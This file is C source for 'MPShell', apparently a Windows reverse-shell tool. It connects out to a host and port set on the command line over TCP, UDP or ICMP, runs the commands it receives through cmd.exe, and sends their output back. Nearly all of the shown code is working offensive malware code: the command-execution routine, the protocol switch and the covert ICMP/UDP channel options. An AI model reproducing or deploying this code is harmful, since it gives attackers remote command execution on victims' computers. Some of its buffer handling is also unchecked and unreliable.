#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#include "mpshell.h"

/* --------------------------------------------------------------------------------------------------------------- */

bool RUN                            = true;
char *host                          = NULL;
char *portString                    = NULL;
int port                            = -1;
int protocol                        = PROTOCOL_TCP;
uint16_t maxPayloadSize             = DEFAULT_MAX_PAYLOAD_SIZE;
DWORD sleepSize                     = DEFAULT_SLEEP;
time_t timeout                      = DEFAULT_TIMEOUT;

/* --------------------------------------------------------------------------------------------------------------- */

void showUsage()
{
    const char *additionalNotes = "\n" \
    "Note that --payload-size, --sleep and --timeout options are only used for UDP/ICMP.\n" \
    "--payload-size option doesn't include protocol (UDP|ICMP) header, or a reverse shell\n" \
    "payload header of 10 bytes.\n\n";

    printf("\nUSAGE: .\\MPShell.exe --host=192.68.0.13 --port=8080 [OPTIONS]\n\n");
    printf("Options:\n");
    printf("-------\n");
    printf("--protocol=tcp|udp|icmp\n");
    printf("%-40s%s\n", "--payload-size=1462",  "[bytes]");
    printf("%-40s%s\n", "--sleep=100",          "[milliseconds]");
    printf("%-40s%s\n", "--timeout=2",          "[seconds]");
    printf(additionalNotes);
    exit(1);
}

/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */

int main(int argc, const char *argv[])
{

    // Parsing command-line arguments
    // ------------------------------
    char delimiter[] = "=";
    for (int i = 1; i < argc; i++)
    {
        char *paramName  = NULL;
        char *paramValue = NULL;

        char *currentArgument = argv[i];
        paramName = strtok(currentArgument, delimiter);

        if (paramName != NULL)
            paramValue = strtok(NULL, delimiter);

        if (paramName != NULL && paramValue != NULL)
        {
            if (strcmp(paramName, "--host") == 0)               { host = paramValue; }
            else if (strcmp(paramName, "--port") == 0)          { port = atoi(paramValue); portString = paramValue; }
            else if (strcmp(paramName, "--protocol") == 0)
            {
                if (strcmp(paramValue, "tcp") == 0)             { protocol = PROTOCOL_TCP; }
                else if (strcmp(paramValue, "udp") == 0)        { protocol = PROTOCOL_UDP; }
                else if (strcmp(paramValue, "icmp") == 0)       { protocol = PROTOCOL_ICMP; }
                else { showUsage(); }
            }
            else if (strcmp(paramName, "--payload-size") == 0)  { maxPayloadSize = (size_t) atoi(paramValue); }
            else if (strcmp(paramName, "--sleep") == 0)         { sleepSize   = (DWORD) (atoi(paramValue)); }
            else if (strcmp(paramName, "--timeout") == 0)       { timeout        = (time_t) (atoi(paramValue)); }
            else { showUsage(); }
        }
        else { showUsage(); }
    }


    // Validating arguments
    // --------------------
    if (host == NULL || strlen(host) == 0)                                                                      { showUsage(); }
    else if ((protocol != PROTOCOL_ICMP) && (port <= 0 || port > 65535))                                        { showUsage(); }
    else if ((protocol != PROTOCOL_TCP) && (sleepSize <= 0))                                                    { showUsage(); }
    else if ((protocol != PROTOCOL_TCP) && (maxPayloadSize <=0 || maxPayloadSize > DEFAULT_MAX_PAYLOAD_SIZE))   { showUsage(); }
    else
    {
        /* Open communication channel */
        switch (protocol)
        {
            case PROTOCOL_TCP:  openTCPChannel(host, portString); break;
            case PROTOCOL_UDP:  openUDPChannel(host, port);       break;
            case PROTOCOL_ICMP: openICMPChannel(host);            break;
        }
    }
}

/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */
/* --------------------------------------------------------------------------------------------------------------- */

void executeCommand(const char *command, struct ResultBuffer *resultBuffer)
{

    BOOL status;
    SECURITY_ATTRIBUTES securityAttributes; 
    securityAttributes.nLength              = sizeof(SECURITY_ATTRIBUTES); 
    securityAttributes.bInheritHandle       = TRUE; 
    securityAttributes.lpSecurityDescriptor = NULL; 

    HANDLE childStdinRead                   = NULL;
    HANDLE childStdinWrite                  = NULL;
    HANDLE childStdoutRead                  = NULL;
    HANDLE childStdoutWrite                 = NULL;

    
    /* Create a pipe for the child process's STDOUT */
    if (!CreatePipe(&childStdoutRead, &childStdoutWrite, &securityAttributes, 0))
    {
        /* Write error message to result buffer */
        const char *errorMessage = "[ERROR] => Could not execute command!";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);
        resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        return;
    }

    /* Ensure the read handle to the pipe for STDOUT is not inherited */
    if (!SetHandleInformation(childStdoutRead, HANDLE_FLAG_INHERIT, 0))
    {
        /* Write error message to result buffer */
        const char *errorMessage = "[ERROR] => Could not execute command!";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);
        resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        return;
    }

    /* Create a pipe for the child process's STDIN */
    if (!CreatePipe(&childStdinRead, &childStdinWrite, &securityAttributes, 0))
    {
        /* Write error message to result buffer */
        const char *errorMessage = "[ERROR] => Could not execute command!";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);
        resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        return;
    }

    /* Ensure the write handle to the pipe for STDIN is not inherited */
    if (!SetHandleInformation(childStdinWrite, HANDLE_FLAG_INHERIT, 0))
    {
        /* Write error message to result buffer */
        const char *errorMessage = "[ERROR] => Could not execute command!";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);
        resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        return;
    }


    // Create the child process
    // ------------------------
    PROCESS_INFORMATION processInfo;
    STARTUPINFO startupInfo;

    ZeroMemory(&processInfo, sizeof(processInfo));
    ZeroMemory(&startupInfo, sizeof(startupInfo));          // Zero the STARTUPINFO struct
    startupInfo.cb = sizeof(startupInfo);                   // Must set size of structure

    startupInfo.hStdError   = childStdoutWrite;
    startupInfo.hStdOutput  = childStdoutWrite;
    startupInfo.hStdInput   = childStdinRead;
    startupInfo.dwFlags    |= STARTF_USESTDHANDLES;

    char finalCommand[MAX_COMMAND_SIZE+11] = "cmd.exe /C ";
    strcat(finalCommand, command);

    status = CreateProcessA(NULL,                           // Application Name
                            finalCommand,                   // CommandLine
                            NULL,                           // Process Attributes
                            NULL,                           // Thread Attributes
                            TRUE,                           // Inherit Handles
                            0,                              // Creation Flags
                            NULL,                           // Environment
                            NULL,                           // Current Directory
                            (LPSTARTUPINFOA) &startupInfo,  // Startup Info
                            &processInfo);                  // Process Information

    if (!status)
    {
        /* Write error message to result buffer */
        const char *errorMessage = "[ERROR] => Could not execute command!";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], errorMessage, strlen(errorMessage)+1);
        resultBuffer->numBytesOccupied += (strlen(errorMessage)+1);
        return;
    }

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    CloseHandle(childStdoutWrite);
    CloseHandle(childStdinRead);
    CloseHandle(childStdinWrite);


    // Read response
    // -------------
    for (;;)
    {
        char buffer[1024] = {0};
        size_t resultSize = 0;
        BOOL status = ReadFile(childStdoutRead, buffer, 1024, &resultSize, NULL);
        if (status == false || resultSize == 0)
            break;

        if (resultSize >= (resultBuffer->numBytesAllocated - resultBuffer->numBytesOccupied))
        {
            size_t newAllocatedSize = (2 * resultBuffer->numBytesAllocated);
            resultBuffer->data = (unsigned char *)realloc(resultBuffer->data, newAllocatedSize);
            resultBuffer->numBytesAllocated = newAllocatedSize;
        }
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], buffer, resultSize);    
        resultBuffer->numBytesOccupied += resultSize;
    }
    if (resultBuffer->numBytesOccupied == 0)
    {
        const char *emptyResponse = "OK";
        memcpy(&resultBuffer->data[resultBuffer->numBytesOccupied], emptyResponse, strlen(emptyResponse)+1);
        resultBuffer->numBytesOccupied = 3;
    }
    else
    {
        resultBuffer->data[resultBuffer->numBytesOccupied] = '\0';
        resultBuffer->numBytesOccupied += 1;
    }

    CloseHandle(childStdoutRead);
}

/* --------------------------------------------------------------------------------------------------------------- */
